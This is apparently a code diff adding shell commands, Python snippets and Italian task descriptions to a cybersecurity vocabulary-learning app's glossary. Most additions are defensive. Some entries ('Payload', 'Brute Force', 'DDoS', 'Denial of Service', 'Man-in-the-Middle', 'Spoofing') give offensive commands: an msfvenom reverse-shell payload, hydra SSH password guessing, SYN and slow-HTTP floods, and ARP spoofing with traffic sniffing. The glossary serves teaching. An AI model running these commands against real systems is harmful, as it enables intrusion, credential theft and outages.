@@ -32,6 +32,8 @@ export default {
               context: 'authentication',
               difficulty: 'beginner',
               note: 'In italiano si usa spesso "password" direttamente, ma la pronuncia inglese \u00E8 diversa!',
+              command: 'openssl rand -base64 24',
+              task: 'Genera una password casuale a entropia elevata partendo da byte sicuri prelevati dal generatore crittografico del sistema.',
             },
             {
               english: 'Hacker',
@@ -54,6 +56,8 @@ export default {
               context: 'malware',
               difficulty: 'beginner',
               note: 'La pronuncia inglese \u00E8 "VAI-res", non "VI-rus" come in italiano.',
+              command: 'clamscan --infected --recursive /home/user/Downloads',
+              task: 'Ispeziona ricorsivamente la cartella dei download segnalando soltanto i file riconosciuti come infetti dal motore antivirus.',
             },
             {
               english: 'Malware',
@@ -65,6 +69,8 @@ export default {
               context: 'malware',
               difficulty: 'beginner',
               note: 'Combinazione di "malicious" + "software". Include virus, trojan, worm, ecc.',
+              command: 'yara -r /opt/yara-rules/malware_index.yar /var/www',
+              task: 'Esegui le regole YARA contro la document root cercando firme note di malware tra i file caricati dagli utenti.',
             },
             {
               english: 'Firewall',
@@ -77,6 +83,8 @@ export default {
               difficulty: 'beginner',
               tool: 'Windows Firewall, pfSense',
               note: 'Letteralmente "muro di fuoco". Filtra il traffico di rete.',
+              command: 'sudo ufw default deny incoming && sudo ufw allow 22/tcp && sudo ufw enable',
+              task: `Configura il firewall in modalita' deny-by-default lasciando aperta soltanto la porta SSH per l'amministrazione remota.`,
             },
             {
               english: 'Security',
@@ -129,6 +137,12 @@ export default {
                 'Without encryption, anyone on the network can read your messages. = Senza crittografia, chiunque nella rete può leggere i tuoi messaggi.',
               context: 'cryptography',
               difficulty: 'beginner',
+              command: 'openssl enc -aes-256-cbc -salt -pbkdf2 -in segreti.txt -out segreti.enc',
+              code: `from cryptography.fernet import Fernet
+key = Fernet.generate_key()
+token = Fernet(key).encrypt(b'dati sensibili del cliente')
+print(token)`,
+              task: `Cifra un file di segreti con AES-256 in modalita' CBC derivando la chiave dalla passphrase tramite PBKDF2.`,
             },
             {
               english: 'Backup',
@@ -139,6 +153,8 @@ export default {
                 'Always make a backup of your important files. = Fai sempre un backup dei tuoi file importanti.',
               context: 'defense',
               difficulty: 'beginner',
+              command: 'tar -czf backup-$(date +%F).tar.gz --exclude=node_modules /srv/app',
+              task: `Crea un archivio compresso datato dell'applicazione escludendo le dipendenze rigenerabili prima di un deploy rischioso.`,
             },
           ],
         },
@@ -156,6 +172,8 @@ export default {
                 'Each employee has a unique username that identifies them in the system. = Ogni dipendente ha un nome utente univoco che lo identifica nel sistema.',
               context: 'authentication',
               difficulty: 'beginner',
+              command: 'getent passwd alice',
+              task: 'Recupera la voce completa di un utente dal database NSS verificandone UID, GID, home e shell di accesso.',
             },
             {
               english: 'Login',
@@ -166,6 +184,8 @@ export default {
                 "Always verify the URL before you login to any service. = Verifica sempre l'URL prima di eseguire il login a qualsiasi servizio.",
               context: 'authentication',
               difficulty: 'beginner',
+              command: 'ssh -i ~/.ssh/id_ed25519 deploy@bastion.prod.local',
+              task: `Effettua l'accesso al bastion di produzione autenticandoti con la chiave ed25519 invece che con la password.`,
             },
             {
               english: 'Logout',
@@ -176,6 +196,8 @@ export default {
                 'Auto-logout after 15 minutes of inactivity is a baseline control on any banking or healthcare portal. = Il logout automatico dopo 15 minuti di inattività è un controllo minimo su qualsiasi portale bancario o sanitario.',
               context: 'authentication',
               difficulty: 'beginner',
+              command: 'sudo pkill -KILL -u alice',
+              task: 'Forza la disconnessione di tutte le sessioni attive di un utente terminando i suoi processi in seguito a una compromissione.',
             },
             {
               english: 'Account',
@@ -186,6 +208,8 @@ export default {
                 'If your account has been compromised, change all passwords immediately. = Se il tuo account \u00E8 stato compromesso, cambia tutte le password immediatamente.',
               context: 'authentication',
               difficulty: 'beginner',
+              command: 'sudo useradd -m -s /bin/bash -G developers alice && sudo passwd alice',
+              task: 'Crea un nuovo account utente con home directory e shell bash assegnandolo al gruppo developers.',
             },
             {
               english: 'Authentication',
@@ -196,6 +220,12 @@ export default {
                 "Two-factor authentication adds an extra layer of security. = L'autenticazione a due fattori aggiunge un livello extra di sicurezza.",
               context: 'authentication',
               difficulty: 'beginner',
+              code: `import hashlib, os
+salt = os.urandom(16)
+stored = hashlib.pbkdf2_hmac('sha256', b'segreta123', salt, 200000)
+check = hashlib.pbkdf2_hmac('sha256', input('password: ').encode(), salt, 200000)
+print('OK' if check == stored else 'NEGATA')`,
+              task: `Verifica una password inserita dall'utente confrontando l'hash PBKDF2 con quello salvato senza esporre la chiave originale.`,
             },
             {
               english: 'Authorization',
@@ -207,6 +237,8 @@ export default {
               context: 'access-control',
               difficulty: 'beginner',
               note: 'Authentication = chi sei. Authorization = cosa puoi fare.',
+              command: 'sudo setfacl -m u:alice:rwx /srv/reports',
+              task: 'Concedi a un singolo utente i permessi di lettura, scrittura ed esecuzione su una directory tramite ACL POSIX.',
             },
             {
               english: 'Credential',
@@ -237,6 +269,8 @@ export default {
                 'Wrong file permissions can expose sensitive data to unauthorized users. = Permessi errati sui file possono esporre dati sensibili a utenti non autorizzati.',
               context: 'access-control',
               difficulty: 'beginner',
+              command: 'chmod 600 ~/.ssh/id_ed25519',
+              task: 'Restringi i permessi della chiave privata SSH al solo proprietario in modo che ssh-agent accetti di caricarla.',
             },
             {
               english: 'Privacy',
@@ -274,6 +308,8 @@ export default {
                 'The vulnerability was discovered by a researcher. = La vulnerabilit\u00E0 \u00E8 stata scoperta da un ricercatore.',
               context: 'vulnerabilities',
               difficulty: 'beginner',
+              command: 'nmap --script vuln -p 80,443 target.com',
+              task: `Lancia gli script di rilevamento vulnerabilita' contro le porte HTTP del bersaglio per individuare CVE noti.`,
             },
             {
               english: 'Exploit',
@@ -285,6 +321,8 @@ export default {
               context: 'attack-techniques',
               difficulty: 'beginner',
               note: 'Come verbo si pronuncia "ik-SPLOIT", come nome spesso "EK-sploit".',
+              command: 'searchsploit apache 2.4.49 path traversal',
+              task: 'Cerca exploit pubblici per una versione vulnerabile di Apache nel database locale di Exploit-DB.',
             },
             {
               english: 'Breach',
@@ -305,6 +343,8 @@ export default {
                 'Delaying a critical security patch leaves the system vulnerable to known exploits. = Ritardare una patch di sicurezza critica lascia il sistema vulnerabile a exploit noti.',
               context: 'defense',
               difficulty: 'beginner',
+              command: 'sudo apt-get install --only-upgrade openssl',
+              task: `Applica soltanto l'aggiornamento correttivo di openssl senza toccare gli altri pacchetti per chiudere una CVE critica.`,
             },
             {
               english: 'Update',
@@ -314,6 +354,8 @@ export default {
               example: `Apply the security update within 48 hours when the vendor flags a vulnerability as actively exploited. = Applica l'update di sicurezza entro 48 ore quando il vendor segnala una vulnerabilità come attivamente sfruttata.`,
               context: 'defense',
               difficulty: 'beginner',
+              command: 'sudo apt-get update && sudo apt-get upgrade -y',
+              task: 'Sincronizza gli indici dei pacchetti e installa tutti gli aggiornamenti disponibili sulla macchina.',
             },
             {
               english: 'Bug',
@@ -335,6 +377,8 @@ export default {
                 'Legitimate emails sometimes end up in the spam folder by mistake. = Le email legittime a volte finiscono nella cartella spam per errore.',
               context: 'threats',
               difficulty: 'beginner',
+              command: 'spamassassin --test-mode < sospetta.eml',
+              task: 'Analizza un messaggio di posta sospetto con SpamAssassin per ottenerne il punteggio e le regole attivate.',
             },
             {
               english: 'Scam',
@@ -357,6 +401,8 @@ export default {
               context: 'defense',
               difficulty: 'beginner',
               tool: 'Windows Defender, Malwarebytes',
+              command: 'sudo freshclam && clamscan -r --infected /home',
+              task: 'Aggiorna le firme antivirus e poi scansiona ricorsivamente le home utente segnalando soltanto i file infetti.',
             },
           ],
         },
@@ -374,6 +420,9 @@ export default {
                 "Before you download any software, verify the publisher's digital signature to ensure it has not been tampered with. = Prima di scaricare qualsiasi software, verifica la firma digitale dell'editore per assicurarti che non sia stato manomesso.",
               context: 'general',
               difficulty: 'beginner',
+              command:
+                'wget https://releases.example.com/app.tar.gz && sha256sum -c app.tar.gz.sha256',
+              task: `Scarica un pacchetto rilasciato dal vendor e verifica l'integrita' del file confrontando l'hash SHA-256 pubblicato.`,
             },
             {
               english: 'Upload',
@@ -384,6 +433,8 @@ export default {
                 'Be careful what you upload to the cloud. = Stai attento a cosa carichi nel cloud.',
               context: 'general',
               difficulty: 'beginner',
+              command: 'scp -i ~/.ssh/deploy_key build.tar.gz deploy@prod.local:/var/releases/',
+              task: `Carica l'artefatto di build sul server di produzione attraverso un canale SSH cifrato con autenticazione a chiave.`,
             },
             {
               english: 'Link',
@@ -394,6 +445,8 @@ export default {
                 'Hovering over a link before clicking reveals its true destination URL, which can help you avoid phishing sites. = Passare il mouse su un link prima di cliccare rivela il suo vero URL di destinazione, aiutandoti a evitare siti di phishing.',
               context: 'threats',
               difficulty: 'beginner',
+              command: `curl -ILs https://bit.ly/3xYzAbc | grep -i '^location:'`,
+              task: 'Segui la catena di reindirizzamenti di un link accorciato senza aprirlo nel browser per rivelarne la destinazione reale.',
             },
             {
               english: 'Browser',
@@ -466,6 +519,8 @@ export default {
                 'Secure your home network with a strong password. = Proteggi la tua rete domestica con una password forte.',
               context: 'networking',
               difficulty: 'beginner',
+              command: 'ip -brief address && ss -tuln',
+              task: 'Elenca le interfacce di rete con i loro indirizzi e poi mostra tutte le porte in ascolto sulla macchina.',
             },
             {
               english: 'Cyber',
@@ -505,6 +560,8 @@ export default {
               context: 'malware',
               difficulty: 'beginner',
               note: 'Da "ransom" (riscatto) + "ware" (software). Uno degli attacchi pi\u00F9 costosi.',
+              command: 'yara -r /opt/rules/ransomware.yar /var/data',
+              task: 'Cerca tracce di famiglie di ransomware note nei file utente applicando un set di regole YARA aggiornato.',
             },
             {
               english: 'Trojan',
@@ -516,6 +573,9 @@ export default {
               context: 'malware',
               difficulty: 'beginner',
               note: 'Come il cavallo di Troia della mitologia: sembra innocuo ma nasconde una minaccia.',
+              command:
+                'sha256sum sospetto.exe | xargs -I {} curl -s https://www.virustotal.com/api/v3/files/{}',
+              task: `Calcola l'hash di un binario sospetto e interroga VirusTotal per scoprire se e' un trojan gia' catalogato.`,
             },
             {
               english: 'Worm',
@@ -537,6 +597,8 @@ export default {
                 'Anti-malware tools can detect spyware hiding on your device. = Gli strumenti anti-malware possono rilevare lo spyware nascosto sul tuo dispositivo.',
               context: 'malware',
               difficulty: 'beginner',
+              command: 'sudo rkhunter --check --skip-keypress',
+              task: `Avvia rkhunter in modalita' automatica per individuare spyware, rootkit e backdoor installati sul sistema.`,
             },
             {
               english: 'Adware',
@@ -547,6 +609,8 @@ export default {
                 'Free software is sometimes bundled with adware that shows pop-up ads. = Il software gratuito \u00E8 a volte accompagnato da adware che mostra pubblicit\u00E0 pop-up.',
               context: 'malware',
               difficulty: 'beginner',
+              command: 'clamscan -r --infected --bell /home/user/.mozilla',
+              task: `Scansiona il profilo Firefox dell'utente alla ricerca di estensioni adware riconosciute dal motore ClamAV.`,
             },
             {
               english: 'Keylogger',
@@ -558,6 +622,8 @@ export default {
               context: 'malware',
               difficulty: 'beginner',
               note: 'Da "key" (tasto) + "logger" (registratore). Pericolosissimo per le password.',
+              command: `sudo lsmod | grep -Ei 'keyboard|input' && sudo cat /proc/bus/input/devices`,
+              task: 'Elenca i moduli kernel e i dispositivi di input attivi per scovare un keylogger software o hardware inserito di nascosto.',
             },
             {
               english: 'Rootkit',
@@ -569,6 +635,8 @@ export default {
               context: 'malware',
               difficulty: 'beginner',
               note: 'Da "root" (amministratore) + "kit" (set di strumenti). Difficili da rilevare.',
+              command: 'sudo chkrootkit -q',
+              task: 'Esegui una scansione silenziosa con chkrootkit cercando file e processi nascosti che indicano la presenza di un rootkit.',
             },
             {
               english: 'Botnet',
@@ -580,6 +648,8 @@ export default {
               context: 'malware',
               difficulty: 'beginner',
               note: 'Una rete di computer "zombie" controllati da un attaccante.',
+              command: `sudo ss -tnp state established '( dport = :6667 or dport = :8080 )'`,
+              task: 'Identifica le connessioni TCP stabilite verso porte tipiche di Command and Control per scoprire host arruolati in una botnet.',
             },
             {
               english: 'Payload',
@@ -591,6 +661,9 @@ export default {
               context: 'malware',
               difficulty: 'beginner',
               note: "La parte del malware che esegue l'azione dannosa vera e propria.",
+              command:
+                'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe',
+              task: 'Genera un payload Meterpreter reverse TCP per Windows da consegnare durante un esercizio di red team autorizzato.',
             },
             {
               english: 'Infection',
@@ -619,6 +692,8 @@ export default {
               context: 'attack-techniques',
               difficulty: 'beginner',
               note: 'Distributed Denial of Service. Migliaia di computer attaccano insieme.',
+              command: 'sudo hping3 --flood --rand-source -S -p 80 target.lab.local',
+              task: `Simula un'inondazione di pacchetti SYN con sorgenti casuali contro un bersaglio di laboratorio per testarne la resilienza a un DDoS.`,
             },
             {
               english: 'Brute Force',
@@ -629,6 +704,8 @@ export default {
                 'Rate limiting and account lockout policies make a brute force attack against the login form impractical. = Il rate limiting e le policy di blocco account rendono impraticabile un attacco di forza bruta contro la form di login.',
               context: 'attack-techniques',
               difficulty: 'beginner',
+              command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ssh',
+              task: `Forza l'autenticazione SSH dell'account amministratore provando ogni password contenuta in rockyou.txt.`,
             },
             {
               english: 'Social Engineering',
@@ -652,6 +729,8 @@ export default {
               context: 'attack-techniques',
               difficulty: 'beginner',
               note: 'L\'attaccante si mette "in mezzo" tra due persone che comunicano.',
+              command: `sudo bettercap -iface wlan0 -eval 'set arp.spoof.targets 192.168.1.42; arp.spoof on; net.sniff on'`,
+              task: 'Posizionati tra la vittima e il gateway tramite ARP spoofing intercettando in chiaro il traffico Wi-Fi non cifrato.',
             },
             {
               english: 'Denial of Service',
@@ -662,6 +741,9 @@ export default {
                 'A denial of service makes websites unavailable. = Una negazione del servizio rende i siti web non disponibili.',
               context: 'attack-techniques',
               difficulty: 'beginner',
+              command:
+                'slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://target.lab.local/login -p 3',
+              task: 'Esaurisci i thread del server web mantenendo aperte molte connessioni HTTP lente per provocare una negazione del servizio.',
             },
             {
               english: 'Identity Theft',
@@ -711,6 +793,8 @@ export default {
                 'Email spoofing makes messages appear from a trusted sender. = Lo spoofing email fa apparire i messaggi da un mittente attendibile.',
               context: 'attack-techniques',
               difficulty: 'beginner',
+              command: 'sudo arpspoof -i eth0 -t 192.168.1.42 192.168.1.1',
+              task: `Falsifica le risposte ARP convincendo la vittima che il MAC dell'attaccante appartiene al gateway predefinito.`,
             },
           ],
         },
@@ -729,6 +813,13 @@ export default {
               context: 'web-security',
               difficulty: 'beginner',
               note: 'Piccoli file che i siti salvano sul tuo computer per ricordarti.',
+              code: `import hmac, hashlib, base64
+secret = b'chiave-server-segreta'
+payload = b'user=alice;role=admin'
+sig = hmac.new(secret, payload, hashlib.sha256).digest()
+cookie = base64.urlsafe_b64encode(payload + b'.' + sig)
+print(cookie)`,
+              task: 'Firma il contenuto di un cookie di sessione con HMAC-SHA256 in modo che il server rilevi qualsiasi manomissione lato client.',
             },
             {
               english: 'Pop-up',
@@ -750,6 +841,9 @@ export default {
               context: 'web-security',
               difficulty: 'beginner',
               note: 'La "S" sta per "Secure". Il lucchetto nel browser indica HTTPS.',
+              command:
+                'openssl s_client -connect bank.example.com:443 -servername bank.example.com -tls1_2',
+              task: 'Apri una connessione TLS 1.2 con il sito bancario per ispezionare la catena di certificati e le suite di cifratura negoziate.',
             },
             {
               english: 'URL',
@@ -760,6 +854,8 @@ export default {
                 'Attackers often use lookalike URLs with misspelled domain names to trick users into visiting fake websites. = Gli aggressori spesso usano URL simili con nomi di dominio scritti male per ingannare gli utenti e farli visitare siti web falsi.',
               context: 'web-security',
               difficulty: 'beginner',
+              command: `curl -sILo /dev/null -w '%{url_effective}\\n' -L https://t.co/abc123`,
+              task: `Segui i redirect di un URL accorciato senza scaricare il corpo per rivelare l'indirizzo finale a cui punta davvero.`,
             },
             {
               english: 'Domain',
@@ -770,6 +866,8 @@ export default {
                 'Attackers register a look-alike domain a few weeks before the campaign so the WHOIS record looks aged. = Gli aggressori registrano un dominio simile qualche settimana prima della campagna così il record WHOIS sembra invecchiato.',
               context: 'web-security',
               difficulty: 'beginner',
+              command: `whois banca-italiana-login.com | grep -Ei 'Creation Date|Registrar'`,
+              task: 'Recupera la data di creazione e il registrar di un dominio sospetto per smascherare un sito di phishing appena registrato.',
             },
             {
               english: 'Certificate',
@@ -780,6 +878,8 @@ export default {
                 'An expired certificate means the site may not be secure. = Un certificato scaduto significa che il sito potrebbe non essere sicuro.',
               context: 'web-security',
               difficulty: 'beginner',
+              command: 'openssl x509 -in server.crt -noout -subject -issuer -dates',
+              task: `Estrai soggetto, emittente e periodo di validita' di un certificato X.509 per controllarne autenticita' e scadenza.`,
             },
             {
               english: 'Redirect',
@@ -790,6 +890,8 @@ export default {
                 'Malicious redirects send you to fake websites. = I reindirizzamenti malevoli ti mandano su siti falsi.',
               context: 'web-security',
               difficulty: 'beginner',
+              command: `curl -sIL -A 'Mozilla/5.0' https://offerte.example.com/promo | grep -iE 'HTTP/|Location:'`,
+              task: 'Traccia ogni salto della catena di reindirizzamenti HTTP individuando eventuali redirect aperti sfruttabili per phishing.',
             },
             {
               english: 'Attachment',
@@ -800,6 +902,8 @@ export default {
                 'A malicious attachment can install ransomware the moment you open it. = Un allegato malevolo può installare ransomware nel momento in cui lo apri.',
               context: 'threats',
               difficulty: 'beginner',
+              command: 'file allegato.pdf && clamscan allegato.pdf',
+              task: `Identifica il tipo MIME reale di un allegato sospetto e scansionalo con ClamAV prima di consegnarlo all'utente.`,
             },
             {
               english: 'Clickjacking',
@@ -810,6 +914,8 @@ export default {
                 'A transparent overlay is the core mechanism behind clickjacking attacks. = Una sovrapposizione trasparente è il meccanismo chiave degli attacchi di clickjacking.',
               context: 'web-security',
               difficulty: 'beginner',
+              command: `curl -sI https://app.example.com | grep -iE 'X-Frame-Options|Content-Security-Policy'`,
+              task: `Verifica se l'applicazione invia gli header anti-framing necessari a impedire che venga incapsulata in un iframe malevolo.`,
             },
             {
               english: 'Malicious',
@@ -837,6 +943,8 @@ export default {
                 'Schedule a weekly authenticated scan of the internal subnet to catch missing patches before attackers do. = Pianifica una scansione autenticata settimanale della subnet interna per intercettare patch mancanti prima degli aggressori.',
               context: 'defense',
               difficulty: 'beginner',
+              command: 'nmap -sV -p 1-1000 target.com',
+              task: 'Scansiona le prime 1000 porte TCP del bersaglio identificando i servizi e le rispettive versioni in ascolto.',
             },
             {
               english: 'Quarantine',
@@ -847,6 +955,8 @@ export default {
                 "The antivirus moved the file to quarantine. = L'antivirus ha spostato il file in quarantena.",
               context: 'defense',
               difficulty: 'beginner',
+              command: 'clamscan -r --move=/var/quarantine --infected /home',
+              task: 'Sposta automaticamente in una directory di quarantena tutti i file rilevati come infetti durante la scansione delle home.',
             },
             {
               english: 'Block',
@@ -857,6 +967,8 @@ export default {
                 'The firewall will block the suspicious connection. = Il firewall bloccher\u00E0 la connessione sospetta.',
               context: 'defense',
               difficulty: 'beginner',
+              command: 'sudo iptables -A INPUT -s 198.51.100.42 -j DROP',
+              task: 'Blocca completamente il traffico in ingresso proveniente da un indirizzo IP coinvolto in tentativi di intrusione ripetuti.',
             },
             {
               english: 'Filter',
@@ -867,6 +979,8 @@ export default {
                 "Well-configured email filters can catch up to 99% of phishing attempts before they reach the user's inbox. = Filtri email ben configurati possono catturare fino al 99% dei tentativi di phishing prima che raggiungano la casella di posta dell'utente.",
               context: 'defense',
               difficulty: 'beginner',
+              command: `sudo tshark -i eth0 -Y 'http.request.method == "POST" && http.host contains "login"'`,
+              task: `Filtra il traffico catturato per mostrare soltanto le richieste POST dirette agli endpoint di login dell'infrastruttura.`,
             },
             {
               english: 'Protect',
@@ -908,6 +1022,8 @@ export default {
               context: 'defense',
               difficulty: 'beginner',
               note: 'I log sono come un diario del sistema: registrano tutto quello che succede.',
+              command: `sudo tail -F /var/log/auth.log | grep -E 'Failed password|Accepted'`,
+              task: 'Segui in tempo reale il log di autenticazione evidenziando tentativi falliti e accessi riusciti per individuare attacchi a forza bruta.',
             },
             {
               english: 'Monitor',
@@ -918,6 +1034,8 @@ export default {
                 'Security teams monitor network traffic around the clock. = I team di sicurezza monitorano il traffico di rete continuamente.',
               context: 'defense',
               difficulty: 'beginner',
+              command: 'sudo tcpdump -i eth0 -w capture.pcap port 443 and not host 10.0.0.5',
+              task: `Cattura su file pcap tutto il traffico HTTPS dell'interfaccia escludendo l'host di gestione per analisi successive.`,
             },
             {
               english: 'Recovery',
@@ -928,6 +1046,8 @@ export default {
                 'A well-tested disaster recovery plan ensures that critical systems can be restored within hours after a ransomware attack or natural disaster. = Un piano di disaster recovery ben testato assicura che i sistemi critici possano essere ripristinati entro poche ore dopo un attacco ransomware o un disastro naturale.',
               context: 'defense',
               difficulty: 'beginner',
+              command: 'sudo rsync -aAX --delete /mnt/backup-2026-05-10/ /srv/app/',
+              task: `Ripristina l'applicazione da uno snapshot integro preservando permessi e attributi estesi dopo un incidente ransomware.`,
             },
           ],
         },
@@ -956,6 +1076,8 @@ export default {
               context: 'defense-tools',
               difficulty: 'intermediate',
               note: 'Sistema passivo: rileva e segnala, ma non blocca. Funziona come un allarme antifurto.',
+              command: 'sudo snort -A console -q -c /etc/snort/snort.conf -i eth0',
+              task: `Avvia l'IDS Snort sull'interfaccia eth0 con output a console per monitorare in tempo reale gli alert durante il turno del SOC.`,
             },
             {
               english: 'IPS (Intrusion Prevention System)',
@@ -967,6 +1089,8 @@ export default {
               context: 'defense-tools',
               difficulty: 'intermediate',
               note: "A differenza dell'IDS, l'IPS \u00E8 attivo: pu\u00F2 bloccare il traffico malevolo in tempo reale.",
+              command: 'sudo suricata -c /etc/suricata/suricata.yaml -i eth0 --runmode autofp',
+              task: 'Esegui Suricata in modalita IPS in linea su eth0 per droppare automaticamente i pacchetti che corrispondono alle regole emerging-threats.',
             },
             {
               english: 'WAF (Web Application Firewall)',
@@ -978,6 +1102,9 @@ export default {
               context: 'defense-tools',
               difficulty: 'intermediate',
               note: 'Opera al livello 7 (applicazione) del modello OSI, filtrando il traffico HTTP/HTTPS.',
+              command:
+                'sudo modsecurity-ctl --enable && sudo nginx -t && sudo systemctl reload nginx',
+              task: `Abilita il WAF ModSecurity davanti a nginx, valida la configurazione e ricarica il servizio per filtrare SQL injection sull'API in produzione.`,
             },
             {
               english: 'SIEM (Security Information and Event Management)',
@@ -989,6 +1116,11 @@ export default {
               context: 'defense-tools',
               difficulty: 'intermediate',
               note: 'Pronunciato come "seem". Aggrega log da tutta la rete per trovare pattern sospetti.',
+              code: `import requests
+q = {'query': {'match': {'event.action': 'failed_login'}}}
+r = requests.post('https://siem.local:9200/winlog-*/_search', json=q, auth=('analyst','***'))
+print(r.json()['hits']['total'])`,
+              task: 'Interroga il SIEM via API Elasticsearch per contare i tentativi di login falliti delle ultime 24 ore nei log di Windows.',
             },
             {
               english: 'Honeypot',
@@ -1000,6 +1132,9 @@ export default {
               context: 'defense-tools',
               difficulty: 'intermediate',
               note: 'Letteralmente "barattolo di miele": un sistema esca che attira gli attaccanti per studiarli.',
+              command:
+                'sudo docker run -d -p 2222:2222 -p 2223:2223 --name cowrie cowrie/cowrie:latest',
+              task: `Distribuisci l'honeypot Cowrie in container per catturare i tentativi di login SSH degli attaccanti e analizzare i comandi che eseguono.`,
             },
             {
               english: 'Sandbox',
@@ -1011,6 +1146,8 @@ export default {
               context: 'defense-tools',
               difficulty: 'intermediate',
               note: 'Come una sabbiera per bambini: un ambiente sicuro dove testare cose potenzialmente pericolose.',
+              command: 'firejail --net=none --private --seccomp ./sample.exe',
+              task: 'Esegui il sample sospetto in una sandbox Firejail senza rete e con seccomp attivo per osservarne il comportamento senza rischi per il sistema.',
             },
             {
               english: 'Proxy',
@@ -1022,6 +1159,9 @@ export default {
               context: 'defense-tools',
               difficulty: 'intermediate',
               note: 'Dal latino "procuratio" (agire per conto di). Fa da intermediario tra utente e internet.',
+              command:
+                'curl -x http://proxy.corp.local:3128 -L https://example.com -o /tmp/page.html',
+              task: `Inoltra la richiesta HTTPS attraverso il proxy aziendale per verificare che il filtraggio dei contenuti permetta l'accesso al dominio approvato.`,
             },
             {
               english: 'VPN (Virtual Private Network)',
@@ -1033,6 +1173,9 @@ export default {
               context: 'defense-tools',
               difficulty: 'intermediate',
               note: 'Crea un "tunnel" crittografato tra il tuo dispositivo e un server remoto.',
+              command:
+                'sudo openvpn --config /etc/openvpn/client/corporate.ovpn --daemon --log /var/log/openvpn.log',
+              task: 'Stabilisci la VPN aziendale OpenVPN in background per accedere in modo cifrato alle risorse interne durante lo smart working.',
             },
             {
               english: 'EDR (Endpoint Detection and Response)',
@@ -1074,6 +1217,12 @@ export default {
               context: 'authentication',
               difficulty: 'intermediate',
               note: 'Due fattori diversi: qualcosa che sai (password) + qualcosa che hai (telefono) o che sei (impronta).',
+              code: `import pyotp
+secret = pyotp.random_base32()
+totp = pyotp.TOTP(secret)
+uri = totp.provisioning_uri(name='alice@corp', issuer_name='VPN')
+print(uri)`,
+              task: `Genera un segreto TOTP e l'URI di provisioning per registrare la 2FA dell'utente nell'app Google Authenticator.`,
             },
             {
               english: 'Multi-Factor Authentication (MFA)',
@@ -1086,6 +1235,12 @@ export default {
               context: 'authentication',
               difficulty: 'intermediate',
               note: 'Termine pi\u00F9 generico di 2FA: pu\u00F2 includere 2 o pi\u00F9 fattori di autenticazione.',
+              code: `import pyotp
+def verify_mfa(secret, code):
+    totp = pyotp.TOTP(secret)
+    return totp.verify(code, valid_window=1)
+print(verify_mfa('JBSWY3DPEHPK3PXP', '492039'))`,
+              task: `Verifica il codice MFA fornito dall'utente con una finestra di tolleranza di 30 secondi prima di concedere l'accesso al portale admin.`,
             },
             {
               english: 'Biometrics',
@@ -1108,6 +1263,12 @@ export default {
               context: 'authentication',
               difficulty: 'intermediate',
               note: 'Pu\u00F2 essere fisico (chiavetta) o software (app come Google Authenticator).',
+              code: `import secrets, hashlib
+raw = secrets.token_urlsafe(32)
+hashed = hashlib.sha256(raw.encode()).hexdigest()
+print('token:', raw)
+print('store:', hashed)`,
+              task: `Genera un token API casuale di 32 byte e salvane solo l'hash SHA-256 sul database per ridurre l'impatto in caso di leak.`,
             },
             {
               english: 'Single Sign-On (SSO)',
@@ -1130,6 +1291,8 @@ export default {
               context: 'authentication',
               difficulty: 'intermediate',
               note: 'Tipico delle API B2B, dei microservizi interni e degli accessi VPN aziendali.',
+              command: `openssl req -new -newkey rsa:4096 -nodes -keyout client.key -out client.csr -subj '/CN=alice@corp/O=Acme'`,
+              task: `Genera la chiave RSA e la CSR per il certificato client di Alice da inviare alla CA aziendale per l'autenticazione mutual TLS.`,
             },
             {
               english: 'One-Time Password (OTP)',
@@ -1141,6 +1304,11 @@ export default {
               context: 'authentication',
               difficulty: 'intermediate',
               note: 'Valida per un solo utilizzo: anche se intercettata, non pu\u00F2 essere riusata.',
+              code: `import pyotp, time
+hotp = pyotp.HOTP('JBSWY3DPEHPK3PXP')
+for counter in range(3):
+    print(counter, hotp.at(counter))`,
+              task: 'Stampa tre OTP HOTP consecutive partendo dal contatore zero per inizializzare il token hardware del nuovo dipendente.',
             },
             {
               english: 'CAPTCHA',
@@ -1174,6 +1342,12 @@ export default {
               context: 'authentication',
               difficulty: 'intermediate',
               note: 'Periodo di connessione autenticata. Scade per sicurezza: se qualcuno ruba il cookie, ha tempo limitato.',
+              code: `from flask import Flask, session
+app = Flask(__name__)
+app.config['SESSION_COOKIE_SECURE'] = True
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['PERMANENT_SESSION_LIFETIME'] = 1800`,
+              task: 'Configura la sessione Flask con cookie Secure, HttpOnly e scadenza a 30 minuti per limitare il furto di sessione via XSS.',
             },
           ],
         },
@@ -1192,6 +1366,9 @@ export default {
               context: 'endpoint-security',
               difficulty: 'intermediate',
               note: 'Spesso abbreviato in NGAV; integrato nelle suite EDR moderne.',
+              command:
+                'sudo clamscan -r --infected --remove=no --log=/var/log/clamav-scan.log /home /var/www',
+              task: 'Scansiona ricorsivamente le home e le webroot con ClamAV registrando solo i file infetti in un log da allegare al report SOC.',
             },
             {
               english: 'Endpoint',
@@ -1214,6 +1391,9 @@ export default {
               context: 'endpoint-security',
               difficulty: 'intermediate',
               note: 'BitLocker (Windows) e FileVault (Mac) sono gli strumenti pi\u00F9 comuni.',
+              command:
+                'sudo cryptsetup luksFormat --type luks2 --cipher aes-xts-plain64 --key-size 512 /dev/sdb1',
+              task: 'Inizializza la crittografia LUKS2 con AES-XTS a 512 bit sul disco esterno prima di consegnarlo al collega in trasferta.',
             },
             {
               english: 'Patch Management',
@@ -1225,6 +1405,9 @@ export default {
               context: 'endpoint-security',
               difficulty: 'intermediate',
               note: '"Patch" significa "toppa": aggiornamenti che riparano falle di sicurezza nel software.',
+              command:
+                'sudo apt update && sudo apt -y --only-upgrade install $(apt list --upgradable 2>/dev/null | grep -i security | cut -d/ -f1)',
+              task: 'Aggiorna solo i pacchetti che pubblicano fix di sicurezza per applicare il patch tuesday senza toccare le versioni applicative in produzione.',
             },
             {
               english: 'Whitelist',
@@ -1236,6 +1419,9 @@ export default {
               context: 'endpoint-security',
               difficulty: 'intermediate',
               note: 'Approccio "permetti solo ci\u00F2 che \u00E8 autorizzato". Pi\u00F9 restrittivo ma pi\u00F9 sicuro della blacklist.',
+              command:
+                'sudo iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/24 -j ACCEPT && sudo iptables -A INPUT -p tcp --dport 22 -j DROP',
+              task: 'Inserisci nella whitelist solo la subnet amministrativa per SSH e blocca esplicitamente tutti gli altri sorgenti sulla porta 22.',
             },
             {
               english: 'Blacklist',
